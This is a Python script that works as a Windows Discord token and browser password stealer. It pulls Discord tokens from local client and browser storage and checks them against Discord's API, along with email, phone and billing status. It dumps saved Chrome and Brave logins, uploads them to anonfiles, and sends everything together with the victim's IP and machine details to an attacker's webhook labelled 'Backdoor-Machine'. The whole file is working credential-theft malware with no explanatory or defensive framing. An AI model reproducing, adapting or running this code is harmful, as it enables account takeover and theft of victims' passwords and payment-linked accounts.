import os

import brave
import chrome

if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from urllib.request import Request, urlopen
import requests
import os
import json


LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")
ROAMING = os.getenv("APPDATA")
mcpath = ROAMING + "\\.minecraft"

webhookurl = open("webhook.txt", "r").read().strip()

PATHS = {

    "Discord": ROAMING + "\\Discord",

    "Discord Canary": ROAMING + "\\discordcanary",

    "Discord PTB": ROAMING + "\\discordptb",

    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",

    "Opera": ROAMING + "\\Opera Software\\Opera Stable",

    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",

    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"

}


def getheaders(token=None, content_type="application/json"):
    headers = {

        "Content-Type": content_type,

        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"

    }

    if token:
        headers.update({"Authorization": token})

    return headers


def installedBrowser():
    chrome = False
    brave = False
    if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
        brave = True
    if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
        chrome = True
    if chrome is True & brave is True:
        return "Both"
    elif chrome is True:
        return "Chrome"
    elif brave is True:
        return "Brave"


def getuserdata(token):
    try:

        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())

    except:

        pass


def deleteLoginfile():
    try:
        os.remove(TEMP + r"\login.txt")
    except Exception:
        pass


def gettokens(path):
    path += "\\Local Storage\\leveldb"

    tokens = []

    for file_name in os.listdir(path):

        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue

        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:

            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):

                for token in findall(regex, line):
                    tokens.append(token)

    return tokens


def getip():
    ip = "None"

    try:

        ip = urlopen(Request("http://ip.42.pl/raw")).read().decode().strip()

    except:

        pass

    return ip


def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"

    try:

        urlopen(Request(url))

    except:

        url = url[:-4]

    return url


def has_payment_methods(token):
    try:

        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getheaders(token))).read().decode())) > 0)

    except:

        pass


def getlogininfo():
    browserInstalled = installedBrowser()
    if browserInstalled == "Chrome":
        chrome.get_password()
        url = 'https://api.anonfiles.com/upload'
        chromelogin_path = TEMP + r"\login.txt"
        files = {'file': (open(chromelogin_path, 'rb'))}
        r2 = requests.post(url, files=files)
        resp2 = json.loads(r2.text)
        if resp2['status']:
            loginUrl2 = resp2['data']['file']['url']['short']
            return loginUrl2
        else:
            return "Anonfiles is down"
    if browserInstalled == "Brave":
        brave.get_password()
        url = 'https://api.anonfiles.com/upload'
        bravelogin_path = TEMP + r"\login.txt"
        files = {'file': (open(bravelogin_path, 'rb'))}
        r2 = requests.post(url, files=files)
        resp2 = json.loads(r2.text)
        if resp2['status']:
            loginUrl2 = resp2['data']['file']['url']['short']
            return loginUrl2
        else:
            return "Anonfiles is down"
    if browserInstalled == "Both":
        chrome.get_password()
        brave.get_password()
        url = 'https://api.anonfiles.com/upload'
        chromelogin_path = TEMP + r"\chromelogin.txt"
        bravelogin_path = TEMP + r"\bravelogin.txt"
        files = {'file': (open(chromelogin_path, 'rb'))}
        r1 = requests.post(url, files=files)
        files = {'file': (open(bravelogin_path, 'rb'))}
        r2 = requests.post(url, files=files)
        resp1 = json.loads(r1.text)
        resp2 = json.loads(r2.text)
        if resp1['status']:
            loginUrl = resp1['data']['file']['url']['short']
            loginUrl2 = resp2['data']['file']['url']['short']
            return loginUrl + "\n" + loginUrl2
        else:
            return "Anonfiles is down"


def main():
    cache_path = ROAMING + "\\.cache~$"

    embeds = []

    working = []

    checked = []

    already_cached_tokens = []

    working_ids = []

    ip = getip()

    loginurl = getlogininfo()

    pc_username = os.getenv("UserName")

    pc_name = os.getenv("COMPUTERNAME")

    for platform, path in PATHS.items():

        if not os.path.exists(path):
            continue

        for token in gettokens(path):

            if token in checked:
                continue

            checked.append(token)

            uid = None

            if not token.startswith("mfa."):

                try:

                    uid = b64decode(token.split(".")[0].encode()).decode()

                except:

                    pass

                if not uid or uid in working_ids:
                    continue

            user_data = getuserdata(token)

            if not user_data:
                continue

            working_ids.append(uid)

            working.append(token)

            username = user_data["username"] + "#" + str(user_data["discriminator"])

            user_id = user_data["id"]

            avatar_id = user_data["avatar"]

            avatar_url = getavatar(user_id, avatar_id)

            email = user_data.get("email")

            phone = user_data.get("phone")

            nitro = bool(user_data.get("premium_type"))

            billing = bool(has_payment_methods(token))

            embed = {

                "color": 0xe00000,

                "fields": [

                    {

                        "name": "**Discord Info**",

                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',

                        "inline": True

                    },

                    {

                        "name": "**Computer Info**",

                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',

                        "inline": True

                    },

                    {

                        "name": "**Discord Token**",

                        "value": token,

                        "inline": False

                    },
                    {

                        "name": "**Login Info from Brave/Chrome**",

                        "value": loginurl,

                        "inline": False

                    }

                ],

                "author": {

                    "name": f"{username} ({user_id})",

                    "icon_url": avatar_url

                }

            }

            embeds.append(embed)

    with open(cache_path, "a") as file:

        for token in checked:

            if not token in already_cached_tokens:
                file.write(token + "\n")

    if len(working) == 0:
        working.append('123')

    webhook = {

        "content": "",

        "embeds": embeds,

        "username": "Backdoor-Machine",

        "avatar_url": "https://cdn.discordapp.com/emojis/766657481966747660.png"

    }

    try:

        urlopen(Request(
            webhookurl,
            data=dumps(webhook).encode(), headers=getheaders()))

    except:

        pass


try:

    main()

except Exception as e:

    print(e)

    pass
